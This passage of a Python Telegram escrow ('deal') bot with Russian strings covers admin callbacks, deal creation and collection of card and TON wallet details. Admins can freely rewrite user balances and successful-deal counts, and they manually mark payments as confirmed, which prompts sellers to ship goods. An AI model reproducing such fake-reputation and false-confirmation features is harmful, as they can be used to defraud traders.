            deal = deals.get(deal_id)
            if deal and deal.get('status') == 'active':
                deal['status'] = 'confirmed'
                save_deal(deal_id)
                seller_id, buyer_id = deal['seller_id'], deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                buyer_username = "Неизвестно"
                if buyer_id:
                    try:
                        buyer_username = (await context.bot.get_chat(buyer_id)).username or "Неизвестно"
                    except Exception:
                        pass
                
                message_text = get_text(lang, "admin_confirm_deal_message", deal_id=deal_id)
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])
                )
                
                if buyer_id:
                    await context.bot.send_message(buyer_id, get_text(buyer_lang, "payment_confirmed_message", deal_id=deal_id), parse_mode="HTML")
                
                seller_message = get_text(seller_lang, "payment_confirmed_seller_message", deal_id=deal_id, description=deal.get('description', ''), buyer_username=buyer_username)
                await context.bot.send_message(seller_id, seller_message, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton(get_text(seller_lang, "seller_confirm_sent_button"), callback_data=f'seller_confirm_sent_{deal_id}')],
                    [InlineKeyboardButton(get_text(seller_lang, "contact_support_button"), url='https://t.me/заполнить')]
                ]))
                
                # Отправляем уведомление о подтверждении сделки
                notification_text = (
                    f"✅ Сделка подтверждена администратором\n"
                    f"ID: #{deal_id}\n"
                    f"Сумма: {deal['amount']} {deal['payment_method'].upper()}\n"
                    f"Продавец: {seller_id}\n"
                    f"Покупатель: {buyer_id if buyer_id else 'Не указан'}"
                )
                await send_notification_to_chat(context, notification_text)

        elif data.startswith('admin_cancel_deal_') and user_id in ADMIN_ID:
            deal_id = data[len('admin_cancel_deal_'):]
            deal = deals.get(deal_id)
            if deal:
                deal['status'] = 'cancelled'
                save_deal(deal_id)
                seller_id, buyer_id = deal.get('seller_id'), deal.get('buyer_id')
                buyer_lang = user_data.get(buyer_id, {}).get('lang', 'ru') if buyer_id else 'ru'
                seller_lang = user_data.get(seller_id, {}).get('lang', 'ru')
                
                message_text = get_text(lang, "admin_cancel_deal_message", deal_id=deal_id)
                await query.edit_message_caption(
                    caption=message_text,
                    parse_mode="HTML",
                    reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]])
                )
                
                notification_text = get_text('ru', "deal_cancelled_notification", deal_id=deal_id)
                if seller_id:
                    await context.bot.send_message(seller_id, notification_text, parse_mode="HTML")
                if buyer_id:
                    await context.bot.send_message(buyer_id, notification_text, parse_mode="HTML")
                
                # Отправляем уведомление об отмене сделки
                cancel_notification = (
                    f"❌ Сделка отменена администратором\n"
                    f"ID: #{deal_id}\n"
                    f"Продавец: {seller_id}\n"
                    f"Покупатель: {buyer_id if buyer_id else 'Не указан'}"
                )
                await send_notification_to_chat(context, cancel_notification)
                
                if deal_id in deals:
                    del deals[deal_id]
                delete_deal(deal_id)

        elif data == 'admin_change_balance' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_change_balance_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'change_balance'

        elif data == 'admin_change_successful_deals' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_change_successful_deals_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'change_successful_deals'

        elif data == 'admin_change_valute' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_change_valute_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'change_valute'

        elif data == 'admin_manage_admins' and user_id in ADMIN_ID:
            message_text = get_text(lang, "admin_manage_admins_message")
            await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='admin_panel')]]))
            admin_commands[user_id] = 'manage_admins'

        else:
            message_text = get_text(lang, "unknown_callback_error")
            try:
                await query.edit_message_caption(caption=message_text, parse_mode="HTML")
            except BadRequest:
                await query.edit_message_text(text=message_text, parse_mode="HTML")

    except (NetworkError, BadRequest) as e:
        if "Message is not modified" not in str(e):
            logger.error(f"Telegram API error in button handler for data '{data}': {e}", exc_info=True)
    except Exception as e:
        logger.error(f"Ошибка в функции button для data '{data}': {e}", exc_info=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global NOTIFICATION_CHAT_ID, VALUTE  # Добавлено объявление VALUTE здесь
    
    try:
        user_id = update.message.from_user.id
        text = update.message.text
        ensure_user_exists(user_id)
        lang = user_data.get(user_id, {}).get('lang', 'ru')

        command_to_execute = admin_commands.get(user_id)

        if user_id in ADMIN_ID and command_to_execute:
            if command_to_execute == 'set_notification_chat' and user_id in SUPER_ADMIN_IDS:
                try:
                    new_chat_id = int(text.strip())
                    NOTIFICATION_CHAT_ID = new_chat_id
                    save_bot_setting("notification_chat_id", str(new_chat_id))
                    await update.message.reply_text(
                        f"✅ ID чата для уведомлений установлен: {new_chat_id}",
                        parse_mode="HTML"
                    )
                    admin_commands[user_id] = None
                    return
                except ValueError:
                    await update.message.reply_text(
                        "❌ Неверный формат ID чата. Введите числовой ID (например, -1001234567890)",
                        parse_mode="HTML"
                    )
                    return

            elif command_to_execute == 'broadcast' and user_id in SUPER_ADMIN_IDS:
                admin_commands[user_id] = None
                success_count = 0
                fail_count = 0
                for target_user_id in user_data:
                    try:
                        await context.bot.send_message(target_user_id, text, parse_mode="HTML")
                        success_count += 1
                    except Exception as e:
                        logger.error(f"Failed to send broadcast message to {target_user_id}: {e}")
                        fail_count += 1
                await update.message.reply_text(
                    f"📢 Рассылка завершена.\nУспешно отправлено: {success_count}\nОшибок: {fail_count}",
                    parse_mode="HTML"
                )

            elif command_to_execute == 'change_balance':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, new_balance = int(parts[0]), float(parts[1])
                    ensure_user_exists(target_user_id)
                    user_data[target_user_id]['balance'] = new_balance
                    save_user_data(target_user_id)
                    await update.message.reply_text(f"💰 Баланс пользователя {target_user_id} изменен на {new_balance} {VALUTE}.", parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат. Введите ID и баланс (например, 12345 100.5).", parse_mode="HTML")
            
            elif command_to_execute == 'change_successful_deals':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, new_deals = int(parts[0]), int(parts[1])
                    ensure_user_exists(target_user_id)
                    user_data[target_user_id]['successful_deals'] = new_deals
                    save_user_data(target_user_id)
                    await update.message.reply_text(f"✅ Успешные сделки {target_user_id} изменены на {new_deals}.", parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат. Введите ID и количество (например, 12345 10).", parse_mode="HTML")

            elif command_to_execute == 'change_valute':
                VALUTE = text.strip().upper()
                await update.message.reply_text(f"💱 Валюта изменена на {VALUTE}.", parse_mode="HTML")

            elif command_to_execute == 'manage_admins':
                try:
                    parts = text.split()
                    if len(parts) != 2:
                        raise ValueError("Incorrect number of arguments")
                    target_user_id, action = int(parts[0]), parts[1]
                    ensure_user_exists(target_user_id)
                    if action == 'add':
                        if target_user_id not in ADMIN_ID:
                            ADMIN_ID.add(target_user_id)
                            user_data[target_user_id]['granted_by'] = user_id
                            user_data[target_user_id]['is_admin'] = 1
                            save_user_data(target_user_id)
                            logger.info(f"Добавлен администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
                            await update.message.reply_text(get_text(lang, "admin_added_message", user_id=target_user_id), parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} уже админ.", parse_mode="HTML")
                    elif action == 'remove':
                        if target_user_id == user_id:
                            await update.message.reply_text(get_text(lang, "admin_cannot_remove_self_message"), parse_mode="HTML")
                        elif target_user_id in SUPER_ADMIN_IDS:
                            await update.message.reply_text(get_text(lang, "admin_cannot_remove_super_admin_message", default="Нельзя удалить суперадминистратора."), parse_mode="HTML")
                        elif target_user_id in ADMIN_ID:
                            ADMIN_ID.remove(target_user_id)
                            user_data[target_user_id]['granted_by'] = None
                            user_data[target_user_id]['is_admin'] = 0
                            save_user_data(target_user_id)
                            logger.info(f"Удален администратор {target_user_id} пользователем {user_id}. ADMIN_ID: {ADMIN_ID}")
                            await update.message.reply_text(get_text(lang, "admin_removed_message", user_id=target_user_id), parse_mode="HTML")
                        else:
                            await update.message.reply_text(f"🚫 Пользователь {target_user_id} не админ.", parse_mode="HTML")
                    else:
                        await update.message.reply_text(get_text(lang, "invalid_action_message"), parse_mode="HTML")
                except (ValueError, IndexError):
                    await update.message.reply_text("❌ Неверный формат: Введите ID и действие (add/remove).", parse_mode="HTML")
            
            admin_commands[user_id] = None

        elif context.user_data.get('awaiting_amount', False):
            try:
                amount_float = float(text)
                if amount_float <= 0:
                    await update.message.reply_text("❌ Сумма должна быть положительным числом.", parse_mode="HTML")
                    return
                context.user_data['amount'] = amount_float
                context.user_data['awaiting_amount'] = False
                context.user_data['awaiting_description'] = True
                message_text = get_text(lang, "awaiting_description_message")
                await update.message.reply_text(message_text, parse_mode="HTML")
            except ValueError:
                await update.message.reply_text("❌ Неверный формат. Введите число для суммы.", parse_mode="HTML")

        elif context.user_data.get('awaiting_description', False):
            deal_id = str(uuid.uuid4())
            payment_method_for_deal = context.user_data.get('payment_method', 'ton')
            
            deals[deal_id] = {
                'amount': context.user_data['amount'],
                'description': text,
                'seller_id': user_id,
                'buyer_id': None,
                'status': 'active',
                'payment_method': payment_method_for_deal
            }
            save_deal(deal_id)
            
            context.user_data.pop('amount', None)
            context.user_data.pop('awaiting_description', None)
            context.user_data.pop('payment_method', None)
            
            valute_for_deal_created = "TON" if payment_method_for_deal == "ton" else "RUB" if payment_method_for_deal == "sbp" else "XTR"
            bot_username = (await context.bot.get_me()).username
            deal_link = f"https://t.me/{bot_username}?start={deal_id}"

            message_text = get_text(lang, "deal_created_message",
                                    amount=deals[deal_id]['amount'],
                                    valute=valute_for_deal_created,
                                    description=deals[deal_id]['description'],
                                    deal_link=deal_link)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )
            
            for admin_id_loop in ADMIN_ID:
                try:
                    seller_chat_info = await context.bot.get_chat(deals[deal_id]['seller_id'])
                    seller_username = seller_chat_info.username or deals[deal_id]['seller_id']
                    await context.bot.send_message(
                        admin_id_loop,
                        f"📄 Новая сделка: #{deal_id}\n💰 Сумма: {deals[deal_id]['amount']} {deals[deal_id]['payment_method'].upper()}\n👤 Продавец: @{seller_username}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.error(f"Failed to send new deal notification to admin {admin_id_loop}: {e}")
            
            # Отправляем уведомление о создании сделки
            notification_text = (
                f"🆕 Новая сделка создана\n"
                f"ID: #{deal_id}\n"
                f"Сумма: {deals[deal_id]['amount']} {deals[deal_id]['payment_method'].upper()}\n"
                f"Описание: {deals[deal_id]['description']}\n"
                f"Продавец: {user_id}"
            )
            await send_notification_to_chat(context, notification_text)

        elif context.user_data.get('awaiting_ton_wallet', False):
            ensure_user_exists(user_id)
            user_data[user_id]['ton_wallet'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_ton_wallet', None)
            message_text = get_text(lang, "wallet_updated", wallet_type="TON", details=text)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

        elif context.user_data.get('awaiting_card', False):
            ensure_user_exists(user_id)
            user_data[user_id]['card_details'] = text
            save_user_data(user_id)
            context.user_data.pop('awaiting_card', None)
            message_text = get_text(lang, "wallet_updated", wallet_type="card", details=text)
            await update.message.reply_text(
                message_text,
                parse_mode="HTML",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')]])
            )

    except (NetworkError, BadRequest) as e:
        logger.error(f"Telegram API error in handle_message: {e}", exc_info=True)
        await update.message.reply_text("🚫 Ошибка сети. Попробуйте позже.", parse_mode="HTML")
    except Exception as e:
        logger.error(f"Ошибка в функции handle_message: {e}", exc_info=True)
        await update.message.reply_text("🚫 Внутренняя ошибка. Попробуйте позже.", parse_mode="HTML")

def main():
    try:
        init_db()
        load_data()
        logger.info("База данных инициализирована и данные загружены.")

        application = Application.builder().token(BOT_TOKEN).build()

        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        logger.info("Бот запущен.")
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Ошибка в main: {e}", exc_info=True)

if __name__ == '__main__':
    main()